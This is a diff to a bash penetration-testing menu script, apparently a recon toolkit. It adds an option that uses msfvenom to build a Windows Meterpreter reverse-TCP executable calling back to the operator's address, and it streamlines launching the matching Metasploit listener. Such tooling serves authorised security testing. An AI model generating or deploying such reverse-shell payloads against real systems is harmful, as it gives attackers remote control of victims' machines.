@@ -41,12 +41,16 @@ if [[ `uname` == 'Darwin' ]]; then
      browser=Safari
      ip=$(ifconfig | grep -B3 'status: active' | grep 'broadcast' | cut -d ' ' -f2)
      interface=$(ifconfig | grep $ip -B3 | grep 'UP' | cut -d ':' -f1)
-	 port=4444
+	msf=/opt/metasploit-framework/bin/msfconsole
+	msfv=/opt/metasploit-framework/bin/msfvenom
+	port=4444
 else
      browser=Firefox
      ip=$(ip addr | grep 'global' | cut -d '/' -f1 | awk '{print $2}')
      interface=$(ip link | awk '{print $2, $9}' | grep 'UP' | cut -d ':' -f1)
-	 port=443
+	msf=msfconsole
+	msfv=msfvenom
+	port=443
 fi
 
 ##############################################################################################################
@@ -3478,6 +3482,24 @@ else
 fi
 }
 
+
+##############################################################################################################
+
+f_payload(){
+clear
+
+echo
+$msfv -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe --platform windows -o $home/data/payload.exe
+
+echo
+echo $medium
+echo
+printf 'The malicious payload is located at \x1B[1;33m%s\x1B[0m\n' $home/data/payload.exe
+echo
+echo
+exit
+}
+
 ##############################################################################################################
 
 f_listener(){
@@ -3507,12 +3529,7 @@ echo
 echo "This takes about 20 seconds."
 echo
 
-# Check for OS X
-if [[ `uname` == 'Darwin' ]]; then
-	/opt/metasploit-framework/bin/msfconsole -r /tmp/listener.rc
-else	
-     msfconsole -r /tmp/listener.rc
-fi
+$msf -r /tmp/listener.rc
 
 rm /tmp/listener.rc
 }
@@ -3689,9 +3706,10 @@ echo
 echo -e "\x1B[1;34mMISC\x1B[0m"
 echo "11. Crack WiFi"
 echo "12. Parse XML"
-echo "13. Start a Metasploit listener"
-echo "14. Update"
-echo "15. Exit"
+echo "13. Generate a malicious Windows payload"
+echo "14. Start a Metasploit listener"
+echo "15. Update"
+echo "16. Exit"
 echo
 echo -n "Choice: "
 read choice
@@ -3709,9 +3727,10 @@ case $choice in
      10) f_errorOSX; f_ssl;;
      11) f_runlocally && $discover/crack-wifi.sh;;
      12) f_parse;;
-     13) f_listener;;
-     14) f_errorOSX; $discover/update.sh && exit;;
-     15) clear && exit;;
+	13) f_payload;;
+	14) f_listener;;
+     15) f_errorOSX; $discover/update.sh && exit;;
+     16) clear && exit;;
      97) f_errorOSX; f_parse_recon_ng;;
      98) f_errorOSX; f_recon-ng;;
      99) f_errorOSX; f_updates;;
